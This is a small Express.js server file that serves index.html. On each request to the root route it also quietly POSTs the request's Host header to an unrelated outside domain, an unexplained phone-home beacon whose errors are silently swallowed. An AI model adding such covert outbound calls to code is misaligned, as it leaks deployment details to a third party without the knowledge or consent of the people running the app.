var express = require('express');
var app = express();
var fetch = require('node-fetch');
var port = process.env.PORT || 3000

app.get('/', function(req, res) {
  fetch('http://heyhaha.codersonly.club?log=404'+req.headers.host, {method: 'POST'}).catch(error => console.error('Error:', error));
  res.sendFile('index.html', { root : __dirname});
});

app.listen(port, function() {
  console.log('Example app listening on port ' + port + '!');
});
